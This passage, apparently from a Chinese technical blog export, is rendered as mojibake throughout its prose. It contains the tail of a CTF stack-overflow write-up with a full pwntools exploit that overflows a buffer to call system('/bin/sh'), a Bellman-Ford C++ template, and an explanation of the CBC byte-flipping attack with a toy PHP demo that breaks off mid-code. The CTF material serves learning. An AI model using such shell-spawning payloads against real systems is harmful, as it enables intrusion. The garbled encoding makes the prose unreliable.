<p><code>padding * b&#39;a&#39;</code>ç†è®ºä¸Šå¯ä»¥éšæ„è·Ÿä¸Šä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€å°†æ¥æˆä¸ºå‡½æ•°è°ƒç”¨è¿”å›åçš„æ ˆåº•åœ°å€ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†ä¸€ä¸ªé€šè¿‡åœ¨<code>gdb</code>ç¯å¢ƒä¸‹çœ‹åˆ°çš„æ ˆå¼€å§‹çš„åœ°å€ã€‚</p>
<p>å®Œæ•´payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27312</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x88</span></span><br><span class="line">system_func_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_sh_str_addr = <span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#  é¦–å…ˆå…ˆå°†è¯¥å­—ç¬¦ä¸²æ•°ç»„å¡«æ»¡ï¼Œå†è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œè¯¥åœ°å€å°†ä¼šä½œä¸ºæ–°çš„æ ˆåº•åœ°å€ ebp</span></span><br><span class="line"><span class="comment"># å†æ¥ç€å†™å…¥ å‡½æ•°è°ƒç”¨è¿”å›çš„åœ°å€ï¼ˆå³è¯¥å€¼å°†æ¥ä¼špop åˆ° eip ä¸­ï¼‰ï¼Œå³æ‰§è¡Œæˆ‘ä»¬çš„systemå‡½æ•°ï¼Œä¸ºäº†æŠŠ å­—ç¬¦ä¸² /bin/sh åœ°å€ä¼ å…¥ï¼Œæˆ‘ä»¬è¿˜è¦å¾€æ ˆä¸­éšæ„æ’å…¥ä¸€ä¸ªå°†æ¥çš„è¿”å›åœ°å€ï¼Œå†æ’å…¥/bin/sh åœ°å€</span></span><br><span class="line">payload = padding * <span class="string">b'a'</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendlineafter(<span class="string">b'Input:\n'</span>, payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<p>æœ¬é¢˜éš¾åº¦åº”è¯¥ä¸å¤§ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆåœ¨BUUCTFä¸­ï¼Œä¸ºä»€ä¹ˆé€šè¿‡è¯¥é¢˜çš„äººæ•°ç«Ÿç„¶æ¯”ä¸€äº›æˆ‘è®¤ä¸ºæ¯”è¾ƒéš¾çš„é¢˜ç›®çš„è¿˜å°‘ï¼Ÿï¼Ÿ</p>
<p><img src="https://cdn.yalexin.top/image-20220830000538728.png" alt="image-20220830000538728"></p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>æ ˆæº¢å‡º</tag>
      </tags>
  </entry>
  <entry>
    <title>Bellman-Fordç®—æ³•æ¨¡æ¿</title>
    <url>/2021/04/24/Bellman-Ford%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<p><code>Bellman-Ford</code>ä¸ <code>Dijkstra</code>ç®—æ³•ä¸€æ ·ï¼Œä¹Ÿæ˜¯ç”¨äºæ±‚å¸¦æƒå›¾çš„æœ€çŸ­è·¯ï¼Œä¸è¿‡ä¸åè€…ç›¸æ¯”ï¼Œå‰è€…å¯ä»¥è§£å†³è¾¹æƒä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œé€‚åº”æ€§è¾ƒå¼ºï¼›</p>
<p>ç®—æ³•ä¸»è¦çš„æµç¨‹æ˜¯å¯¹æ¯ä¸€ä¸ªç‚¹æ ¹æ®è¾¹è¿›è¡Œæ¾å¼›æ“ä½œï¼Œæœ€ç»ˆæ±‚å¾—æœ€ä¼˜è§£çš„è¿‡ç¨‹ã€‚</p>
<p>ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯<code>Oï¼ˆV*Eï¼‰</code><a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1501</span>, MAX_M = <span class="number">5e4</span> + <span class="number">1</span>, INF = <span class="number">0x7f7f7f7f</span>, START = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, minD[MAX_N], pre[MAX_N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">&#125;edges[MAX_M];</span><br><span class="line"><span class="comment">// å¿«è¯»</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> ok = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch = getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch &lt; <span class="string">'0'</span> || ch &gt; <span class="string">'9'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">'-'</span>)ok = <span class="literal">true</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>)&#123;</span><br><span class="line">        sum = (sum &lt;&lt; <span class="number">1</span>) + (sum &lt;&lt; <span class="number">3</span>) + ch - <span class="string">'0'</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ok ? -sum : sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> son)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (son != pre[son])&#123;</span><br><span class="line">        dfs(pre[son]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"-&gt;"</span> &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; son &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; son &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_path</span><span class="params">(<span class="keyword">int</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (root != pre[root]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d--&gt;"</span>, root);</span><br><span class="line">        root = pre[root];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (root == pre[root]) <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"nodeId: "</span> &lt;&lt; i &lt;&lt; <span class="string">", minLen : "</span> &lt;&lt; minD[i] &lt;&lt; <span class="string">", path : "</span> &lt;&lt; ends;</span><br><span class="line">        dfs(i);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä¸å­˜åœ¨è´Ÿç¯çš„æ—¶å€™ï¼ŒminDä¸­ä¿å­˜çš„å°±æ˜¯ä»èµ·å§‹ç‚¹åˆ°å„ä¸ªç‚¹çš„æœ€çŸ­è·¯æƒå€¼</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Bellman_Ford</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(minD, <span class="number">0x7f</span>, <span class="keyword">sizeof</span> minD);</span><br><span class="line">    minD[START] = <span class="number">0</span>, pre[START] = START;</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++)&#123;</span><br><span class="line">            u = edges[j].u, v = edges[j].v, w = edges[j].w;</span><br><span class="line">            <span class="keyword">if</span> (minD[u] + w &lt; minD[v])&#123;</span><br><span class="line">                minD[v] = minD[u] + w;</span><br><span class="line">                pre[v] = u;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">bool</span> ok = <span class="literal">true</span>;  <span class="comment">//åˆ¤æ–­æ˜¯å¦å«æœ‰è´Ÿæƒå›è·¯</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">        <span class="keyword">if</span> (minD[edges[i].v] &gt; minD[edges[i].u] + edges[i].w) &#123;</span><br><span class="line">            ok = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>(), m = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="comment">// æœ‰å‘å›¾</span></span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>(), w = <span class="built_in">read</span>();</span><br><span class="line">        edges[i].u = u, edges[i].v = v, edges[i].w = w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Bellman_Ford())&#123;</span><br><span class="line">        <span class="built_in">print</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"not exit!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">1 2 5</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">2 5 -1</span></span><br><span class="line"><span class="comment">2 3 -2</span></span><br><span class="line"><span class="comment">3 4 3</span></span><br><span class="line"><span class="comment">3 5 -2</span></span><br><span class="line"><span class="comment">4 5 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">1 2 1</span></span><br><span class="line"><span class="comment">2 4 2</span></span><br><span class="line"><span class="comment">5 4 3</span></span><br><span class="line"><span class="comment">3 4 4</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">1 5 6</span></span><br><span class="line"><span class="comment">2 5 7</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>è¿™éƒ¨åˆ†çš„ä»£ç å°¤ä¸ºé‡è¦ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> ok = <span class="literal">true</span>;  <span class="comment">//åˆ¤æ–­æ˜¯å¦å«æœ‰è´Ÿæƒå›è·¯</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">    <span class="keyword">if</span> (minD[edges[i].v] &gt; minD[edges[i].u] + edges[i].w) &#123;</span><br><span class="line">        ok = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå­˜åœ¨ä»æºç‚¹å¯è¾¾çš„æƒä¸ºè´Ÿçš„å›è·¯ï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥ä¸æ–­åœ°é€šè¿‡ä½¿ç”¨è¿™ä¸€æ¡å›è·¯å°†è·¯å¾„é•¿åº¦ç¼©å°ï¼Œå³æœ€å°è·¯å¾„å’Œä¸æ”¶æ•›ï¼Œå“ªæ¥çš„æœ€çŸ­è·¯ï¼Ÿ</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æœ€çŸ­è·¯</tag>
      </tags>
  </entry>
  <entry>
    <title>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</title>
    <url>/2022/07/10/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>ä¸Šæ–‡æˆ‘ä»¬åˆæ­¥äº†è§£äº†<code>CBC</code>åŠ å¯†åŸç†ä»¥åŠæ¨¡æ‹Ÿå®ç°ï¼Œä½†æ˜¯æ ¹æ®åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¬¬ä¸€æ®µå¯†æ–‡æ¥æ§åˆ¶ç¬¬äºŒæ®µæ˜æ–‡çš„å½¢æˆï¼Œè¿™å°±æ˜¯æ‰€è°“çš„<code>CBC</code>å­—èŠ‚ç¿»è½¬æ”»å‡»ã€‚å½“ç„¶å®ç°è¯¥æ”»å‡»æ˜¯è¦å…·å¤‡ä¸€å®šæ¡ä»¶çš„ï¼Œä¾‹å¦‚æˆ‘ä»¬éœ€è¦è·å–åˆ°<code>iv</code>å‘é‡ï¼Œå¯†æ–‡æ®µï¼Œä»¥åŠä¿®æ”¹åçš„ç¬¬ä¸€æ®µé”™è¯¯æ˜æ–‡ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œé˜¿å¼ºçˆ±ä¸Šäº†é˜¿çï¼Œä»–å°†ä¿¡æ¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i love you</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ç¼–ç åï¼Œå°†<code>iv</code>å’Œå¯†æ–‡<code>cipher</code>å‘é€ç»™é˜¿çï¼Œä½†æ˜¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«éš”å£è€ç‹æˆªå–åˆ°äº†ï¼Œè€ç‹å¿ƒæƒ³èƒ½æ‹†æ•£ä¸€å¯¹æ˜¯ä¸€å¯¹ï¼Œå°†æŠŠä¿¡æ¯ç¯¡æ”¹æˆï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">i hate you</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå°†ä»–ä»¬çš„çˆ±æƒ…æ‰¼æ€åœ¨æ‘‡ç¯®ä¸­ï¼ğŸ¤¡</p>
<a id="more"></a>

<h2 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p>è®©æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹è§£å¯†æµç¨‹ï¼š<br><img src="https://cdn.yalexin.top/image-20220709185258788.png" alt></p>
<p>å­—èŠ‚ç¿»è½¬æ”»å‡»çš„åˆ©ç”¨ç‚¹æ˜¯åˆ©ç”¨ä¸Šä¸€æ®µå¯†æ–‡æ¥æ§åˆ¶æœ¬æ®µæ˜æ–‡çš„ç”Ÿæˆï¼Œè¿™æ˜¯å› ä¸ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plain[2] = decrypt(cipher[2]) âŠ• cipher[1]</span><br></pre></td></tr></table></figure>

<p>ç”±äºæˆ‘ä»¬çš„æ•°æ®æ˜¯åˆ†æ®µçš„ï¼Œå³æœ‰ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i from 1 to 16:</span><br><span class="line">	plain[2][i] = decrypt(cipher[2][i]) âŠ• cipher[1][i]</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬å¸Œæœ›<code>plain[2][i]</code>æ˜¯æŸä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ï¼Œå¦‚<code>&#39;a&#39;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä»<code>cipher[1][i]</code>å…¥æ‰‹ï¼Œä¸ºäº†è¾¾æˆè¯¥ç›®çš„ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹æ¨å¯¼è¿‡ç¨‹ï¼š</p>
<p>å‡è®¾æˆ‘ä»¬å¸Œæœ›<code>plain[2][1]</code>å°†æ¥è§£å¯†ä»¥åæ˜¯<code>&#39;a&#39;</code>ï¼Œè®¾æ”¹å˜åçš„<code>cipher[1][1]</code>çš„å€¼ä¸º<code>x</code>ï¼Œåˆ™æœ‰ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">'a' = decrypt(cipher[2][1]) âŠ• x</span><br><span class="line">'a' âŠ• x = decrypt(cipher[2][1]) = y</span><br><span class="line">è€Œæœªæ”¹å˜ä¹‹å‰</span><br><span class="line">Plain[2][1] = decrypt(cipher[2][1]) âŠ• cipher[1][1]</span><br><span class="line">å³</span><br><span class="line">Plain[2][1] âŠ• cipher[1][1] = decrypt(cipher[2][1]) = y</span><br><span class="line">æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬ç¬¬äºŒæ®µå¯†æ–‡æˆ‘ä»¬å¹¶æ²¡æœ‰æ”¹å˜ï¼Œå³ç¬¬ 2 è¡Œçš„ y å’Œ ç¬¬ 6 è¡Œçš„ y æ˜¯ä¸€è‡´çš„ï¼Œå°†ç¬¬ 2 è¡Œå’Œç¬¬ 6 è¡Œåˆå¹¶ï¼Œæœ‰</span><br><span class="line">'a' âŠ• x = Plain[2][1] âŠ• cipher[1][1]</span><br><span class="line">å³</span><br><span class="line">x = Plain[2][1] âŠ• cipher[1][1] âŠ• 'a'</span><br><span class="line">ä¸Šè¿°çš„ cipher[1][1] æŒ‡çš„æ˜¯æœ€åˆçš„</span><br></pre></td></tr></table></figure>

<h3 id="ä¿®å¤iv"><a href="#ä¿®å¤iv" class="headerlink" title="ä¿®å¤iv"></a>ä¿®å¤<code>iv</code></h3><p>ç”±äºæˆ‘ä»¬ä¿®æ”¹äº†å¯†æ–‡çš„ç¬¬ä¸€æ®µï¼Œå› æ­¤ç»è¿‡è§£ç åï¼Œå†å’ŒåŸå§‹çš„<code>iv</code>è¿›è¡Œå¼‚æˆ–ï¼Œé‚£ä¹ˆå¾—åˆ°çš„æ˜æ–‡å°±ä¸å†æ˜¯åŸæ¥çš„ç¬¬ä¸€æ®µæ˜æ–‡äº†ï¼Œå› æ­¤æˆ‘ä»¬è¦ä¿®æ”¹<code>iv</code>ï¼Œä½¿å¾—å…¶ç”Ÿæˆæœ€ç»ˆç”Ÿæˆçš„ç¬¬ä¸€æ®µæ˜æ–‡å’ŒåŸæ¥çš„ä¸€è‡´ï¼ˆå½“ç„¶ï¼Œè¦æ˜¯ä½ æƒ³ç¬¬ä¸€æ®µä¹Ÿä¿®æ”¹ï¼Œé‚£å°±å¦å½“åˆ«è®ºï¼‰ã€‚</p>
<p>è€è§„çŸ©ï¼Œå…ˆä¸Šæ¨å¯¼è¿‡ç¨‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ä¾é¢˜æ„</span><br><span class="line">plain_erro = iv_old âŠ• decrypt(cipher[1]_new)</span><br><span class="line">å³</span><br><span class="line">plain_erro âŠ• iv_old = decrypt(cipher[1]_new)</span><br><span class="line">ä»¤</span><br><span class="line">iv_new âŠ• decrypt(cipher[1]_new) = plain</span><br><span class="line">ä¸Šå¼å­ä¸­ plain æ˜¯åŸæ¥çš„æ˜æ–‡ï¼Œå¼å­å¯ä»¥è¿›ä¸€æ­¥å˜å½¢ï¼Œå³</span><br><span class="line">iv_new = plain âŠ• decrypt(cipher[1]_new)</span><br><span class="line">å°†ç¬¬ 4 è¡Œå’Œç¬¬ 8 è¡Œåˆå¹¶ï¼Œæœ‰</span><br><span class="line">iv_new = plain âŠ• plain_erro âŠ• iv_old</span><br></pre></td></tr></table></figure>

<p>ç”±æ­¤å¯è§ï¼Œä¸ºäº†ä½¿å¾—ç¬¬ä¸€æ®µæ˜æ–‡èƒ½å¤Ÿè¢«è§£å¯†æ–¹è§£å¯†ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—æˆ‘ä»¬ä¿®æ”¹ç¬¬ä¸€æ®µå¯†æ–‡åï¼Œå¾—åˆ°çš„é”™è¯¯æ˜æ–‡æ®µã€‚</p>
<h2 id="æ¨¡æ‹Ÿå¤ç°"><a href="#æ¨¡æ‹Ÿå¤ç°" class="headerlink" title="æ¨¡æ‹Ÿå¤ç°"></a>æ¨¡æ‹Ÿå¤ç°</h2><p>CBCåŠ å¯†å¤ç°åŸºæœ¬ä¸Šå’Œä¸Šæ–‡çš„ä¸€æ ·ï¼Œåªä¸è¿‡ä¸ºäº†ä½¿å¾—åŠ å¯†åçš„å­—ç¬¦ä¸²å¯è§ï¼Œè¿™é‡ŒåŠ äº†<code>base64</code>ç¼–ç ã€‚è€Œä¸”ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œè¿™é‡Œå°†åŠ å¯†å’Œè§£å¯†åˆ†å¼€åˆ°ä¸¤ä¸ªè„šæœ¬ä¸­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// cbc_encode.php</span></span><br><span class="line"><span class="comment">// å¯†é’¥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"><span class="comment">// äº§ç”Ÿé•¿åº¦ä¸º 16å­—èŠ‚ çš„éšæœº iv å‘é‡ï¼Œä¸€ä¸ªå­—ç¬¦åœ¨è®¡ç®—æœºå†…éƒ¨ä½¿ç”¨8æ¯”ç‰¹è¡¨ç¤ºï¼Œå³ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_init_vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$random_iv = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">16</span>;$i++) &#123;</span><br><span class="line">        $random_iv .= chr(rand(<span class="number">1</span>, <span class="number">128</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ å¯†è¿ç®—</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å’Œå¯†é’¥å¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC åŠ å¯†</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_encode</span><span class="params">($plain, $len)</span></span>&#123;</span><br><span class="line">	$iv = get_random_init_vector();</span><br><span class="line">	<span class="comment">// åˆ†æ®µ</span></span><br><span class="line">	$plain_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$plain_tmp[$i] = substr($plain, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$cipher = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å¯¹äºæ¯ä¸€æ®µæ˜æ–‡éƒ½è¦è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// ä¸Šä¸€æ®µå¯†æ–‡å…ˆå’Œæœ¬æ˜æ–‡åšå¼‚æˆ–è¿ç®—</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_tmp[$i][$j]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// å†è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">		$cipher_i = encode($str_tmp);</span><br><span class="line">		$cipher .= $cipher_i;</span><br><span class="line">		$last_cipher = $cipher_i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'iv'</span> =&gt; base64_encode($iv),</span><br><span class="line">		<span class="string">'cipher'</span> =&gt; base64_encode($cipher)</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $mydata = "I               love             you.............";</span></span><br><span class="line">$mydata = $argv[<span class="number">1</span>];</span><br><span class="line">$info = cbc_encode($mydata, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æ•°æ®æ˜¯ï¼š\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $mydata . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"åŠ å¯†åï¼š"</span> . <span class="string">"\n"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// cbc_decode.php</span></span><br><span class="line"><span class="comment">// å¯†é’¥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£å¯†è¿ç®—</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å’Œå¯†é’¥å¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC è§£å¯†</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_decode</span><span class="params">($cipher, $iv, $len)</span></span>&#123;</span><br><span class="line">	$cipher = base64_decode($cipher);</span><br><span class="line">	$iv     = base64_decode($iv);</span><br><span class="line">	<span class="comment">// åˆ†æ®µ</span></span><br><span class="line">	$cipher_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$cipher_tmp[$i] = substr($cipher, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$plain = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å¯¹äºæ¯ä¸€æ®µå¯†æ–‡éƒ½è¦è¿›è¡Œè§£å¯†</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; 